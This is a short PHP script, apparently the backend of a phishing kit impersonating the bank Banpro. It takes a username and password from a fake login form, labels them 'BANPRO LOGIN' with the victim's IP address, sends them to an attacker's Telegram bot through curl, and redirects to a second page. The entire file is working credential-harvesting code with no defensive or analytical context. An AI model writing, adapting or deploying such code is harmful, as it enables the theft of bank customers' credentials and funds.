<?php
// Incluir el archivo de configuración
$config = include('config.php');

// Verificar si los datos de configuración existen
if (!isset($config['token']) || !isset($config['chat_id'])) {
    echo "Error: Configuración de Telegram no encontrada.";
    exit;
}

// Obtener los valores de configuración
$token = $config['token'];
$chat_id = $config['chat_id'];

// Obtener los valores enviados desde el formulario
$usuario = isset($_POST['ips1']) ? htmlspecialchars($_POST['ips1']) : '';
$contrasena = isset($_POST['ips2']) ? htmlspecialchars($_POST['ips2']) : '';

// Validar que se recibieron los datos
if (empty($usuario) || empty($contrasena)) {
    echo "Error: Todos los campos son obligatorios.";
    exit;
}

// Obtener la IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];

// Crear el mensaje
$mensaje = "BANPRO LOGIN> IP: $ip - Usuario: $usuario - Contraseña: $contrasena";

// Enviar el mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje
];

// Usar cURL para realizar la solicitud
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
if ($response === false) {
    echo "Error al enviar el mensaje: " . curl_error($ch);
    exit;
}

// Cerrar cURL
curl_close($ch);

// Redirigir después de enviar el mensaje
header("Location: 2.html");
exit;
?>
